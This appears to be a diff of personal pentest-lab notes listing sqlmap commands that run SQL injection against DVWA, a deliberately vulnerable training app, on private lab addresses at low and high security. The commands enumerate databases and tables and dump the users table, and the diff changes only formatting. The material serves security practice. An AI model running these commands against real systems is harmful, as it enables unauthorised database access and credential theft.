@@ -2,7 +2,7 @@
 
 **SQL Injection DVWA-Low:**
 $ sqlmap -u "http://192.168.0.109/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=8566j3a1sso9lilhudv6ht9pqn; security=low" --dbs
-$sqlmap -u "http://192.168.0.109/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=8566j3a1sso9lilhudv6ht9pqn; security=low" -D dvwa -tables
+$ sqlmap -u "http://192.168.0.109/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=8566j3a1sso9lilhudv6ht9pqn; security=low" -D dvwa -tables
 $ sqlmap -u "http://192.168.0.109/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=8566j3a1sso9lilhudv6ht9pqn; security=low" -D dvwa -T users -columns
 $ sqlmap -u "http://192.168.0.109/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=8566j3a1sso9lilhudv6ht9pqn; security=low" -D dvwa -T users -dump 
 
@@ -18,7 +18,7 @@ $ sqlmap -u "http://192.168.100.8/dvwa/vulnerabilities/sqli/session-input.php" -
 $ sqlmap -u "http://192.168.100.8/dvwa/vulnerabilities/sqli/session-input.php" --cookie="PHPSESSID=sv0m9s1dv0kp23lv9ajjtsbrfn; security=high" --data="id=3&Submit=Submit" --second-url http://192.168.100.8/dvwa/vulnerabilities/sqli/ -D dvwa -tables  
 $ sqlmap -u "http://192.168.100.8/dvwa/vulnerabilities/sqli/session-input.php" --cookie="PHPSESSID=sv0m9s1dv0kp23lv9ajjtsbrfn; security=high" --data="id=3&Submit=Submit" --second-url http://192.168.100.8/dvwa/vulnerabilities/sqli/ -D dvwa -tables --dump 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 **DVWA SQL Injection (Manual, Zaproxy & Burpsuite)**
 
 DVWA Low: 
